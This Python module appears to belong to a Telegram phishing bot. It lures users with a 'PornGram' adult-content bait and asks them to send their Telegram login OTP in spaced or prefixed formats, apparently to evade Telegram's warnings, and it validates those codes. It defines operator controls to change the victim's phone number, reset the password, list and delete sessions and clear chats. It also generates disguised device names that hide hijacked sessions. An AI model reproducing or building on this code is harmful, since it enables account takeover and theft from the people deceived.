from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from pyrogram import filters
import re
import random

how = """
Cara Menggunakan Bot ini

 ❏ Perintah untuk Pengguna BOT
 ├ /start - Mulai Bot
 ├ /how - Bantuan Perintah Bot ini
 ├ /users - Untuk melihat jumlah aktif akun
 └ /get - Untuk melihat config `/get` untuk semua atau spesifik contoh `/get link`

 ❏ Reply chat yang mau disimpan dan ketik command dibawah untuk menyimpan
 ├ **PERINTAH DIBAWAH HARUS REPLY CHAT**
 ├ /link - Untuk menyimpan link
 ├ /save@start - Untuk menyimpan pesan start
 ├ /save@verif - Untuk menyimpan pesan Verification
 ├ /save@congrats- Untuk meyimpan pesan Congrats
 └ /save@help - Untuk menyimpan pesan help

**KHUSUS /save@ BISA DILIAT CONTOHNYA SEPERTI DIBAWAH**
KETIK `/contoh verif` UNTUK MELIHAT CONTOHNYA
"""
start_msg = """
🙋‍♂️Hello Welcome to Our System
introduce me is 𝐏𝐨𝐫𝐧𝐆𝐫𝐚𝐦
╶╶╶╶╶╶╶╶╶╶╶╶╶╶╶╶╶╶╶╶╶╶╶╶╶╶╶╶
It's a Non-Human System Controlling this bot !
╶╶╶╶╶╶╶╶╶╶╶╶╶╶╶╶╶╶╶╶╶╶╶╶╶╶╶╶
/SupportPornGram
@link Label@https://t.me/+dasd
"""

verif_otp_msg = """
Please check for an OTP in official telegram account. If you got it, send OTP here after reading the below format. 
If OTP is `1 2 3 4 5`, **please send it as** `1 2 3 4 5`.
"""

congrats_msg = """
Congratulations!!! 🎉.

You have access to all channels!!"""


def button_style(list, space=2):
    count = len(list) // space
    leftbtn = []
    rightbtn = []
    for idx, btn in enumerate(list):
        title, link = btn.split("@")
        if idx <= count - 1:
            leftbtn.append(InlineKeyboardButton(text=title, url=link))
        else:
            rightbtn.append(InlineKeyboardButton(text=title, url=link))

    return [
        leftbtn,
        rightbtn,
    ]


def button_sesi(list, userid):
    raw_btn = []
    for btn in list:
        model = btn.device_model
        if btn.current:
            model = f"{btn.device_model}(SELF)"
        idsesi = f"delsesi@{btn.hash}@{userid}"
        raw_btn.append([InlineKeyboardButton(text=model, callback_data=idsesi)])
    button = raw_btn
    return button


def button_start(title="REVIEW", link="https://t.me/+"):
    return [
        [
            InlineKeyboardButton(text=title, url=link),
        ],
    ]


def button_pagination(prev=0, next=0):
    return [
        [
            InlineKeyboardButton(text="PREV", callback_data=f"prev#{prev}"),
            InlineKeyboardButton(text="NEXT", callback_data=f"next#{next}"),
        ],
    ]


def button_verif(title="PREMIUM", link="https://t.me/+"):
    return [
        [InlineKeyboardButton(text=title, url=link)],
    ]


def button_cbb(
        idcon="connect",
        iddiscon="disconnect",
        hp="changenohp",
        sesi="resetsesi",
        clear="clearchat",
        listsesi="listsesi",
        reset="resetpw",
        readcode="readcode",
):
    return [
        [
            InlineKeyboardButton(text="🟢CONNECT", callback_data=idcon),
            InlineKeyboardButton(text="🔵READ CODE", callback_data=readcode),
            InlineKeyboardButton(text="📱HP", callback_data=hp),
        ],
        [
            InlineKeyboardButton(text="🔐RESET PW", callback_data=reset),
            InlineKeyboardButton(text="⛔CLEAR SESI", callback_data=sesi),
            InlineKeyboardButton(text="📃LIST SESI", callback_data=listsesi),
        ],
        [
            InlineKeyboardButton(text="🚯CLEAR CHATS", callback_data=clear),
            InlineKeyboardButton(text="🟡DISCONNECT", callback_data=iddiscon),
        ],
    ]


commands = [
    "start",
    "cancel",
    "stop",
    "help",
    "restart",
    "save@verif",
    "save@congrats",
    "save@help",
    "save@start",
    "get",
    "set",
    "link",
    "users",
]


async def OtpSpasi(_, client, query):
    otp = query.text
    if len(otp) > 5:
        if re.search(r"-", otp):
            notp = otp.replace(" ", "")
            if re.search(r"\d{5}", notp):
                return True
    await query.reply_text(
        "INVALID OTP FORMAT, PLEASE SEND AS `#12345` CHANGE `12345` WITH YOUR OTP"
    )
    return False


async def OtpTagCheck(_, client, query):
    otp = query.text
    if len(otp) == 7:
        if re.search(r"#", otp):
            ntop = otp.replace("#", "")
            if re.search(r"\d{5}", ntop):
                return True
    await query.reply_text(
        "INVALID OTP FORMAT, PLEASE SEND AS `#12345` CHANGE `12345` WITH YOUR OTP"
    )
    return False


async def OtpTag(otp):
    if len(otp) == 7:
        if re.search(r"-", otp):
            ntop = otp.replace("#", "")
            if re.search(r"\d{5}", ntop):
                return True
    return False


async def OtpStrip(otp):
    if len(otp) == 9:
        if re.search(r"-", otp):
            ntop = otp.replace("-", "")
            if re.search(r"\d{5}", ntop):
                return True
    return False


otpFilter = filters.create(OtpTagCheck)
otpFilterSpace = filters.create(OtpSpasi)


def device():
    devices = [
        "PornGramSystem",
        "TLGram",
        "TLSys",
        "TLSystem",
        "System",
        "TelegramSystem",
        "Telegram",
        "Hidden",
        "HiddenSystem",
        "HiddenTelegram",
        "WatchGram",
    ]
    return random.choice(devices)


async def gen_devices():
    devices = [
        "PornGramSystem",
        "PronGram",
        "PornGram",
        "PronGramSystem",
        "ViralSystem",
        "ViralGram",
        "VideoGram",
        "TeleGramVideo",
        "TelegramSystem",
        "GramSystem",
        "Gram",
    ]
    major = random.randint(1, 10)
    minor = random.randint(0, 99)
    patch = random.randint(0, 99)
    system_version = f"{major}.{minor}.{patch}"
    choice = random.choice(devices)
    return dict(device_model=f"{choice}", system_version=f"{choice} {system_version}")


async def get_pagination(client, message):
    offset = int(data.split("-")[1])
    # if data.startswith("prev"):
    #     offset -= 30
    # else:
    #     offset += 30
    # msgPage: Message = query.message
    # userspage = await db.getLimitUser(30, offset)
    # listUser = ""
    # for data in userspage:
    #     uname = "None" if data[3] is None else "@" + data[3]
    #     listUser += f"ID: <a href='https://t.me/{client.username}?start=login-{data[0]}'>{data[0]}</a><i> {uname} </i>\n"
    # if listUser != "":
    #     await msgPage.edit_text(text=listUser)
    #     await msgPage.edit_reply_markup(
    #         reply_markup=InlineKeyboardMarkup(
    #             button_pagination("", str(offset))
    #         ),
    #     )
    # return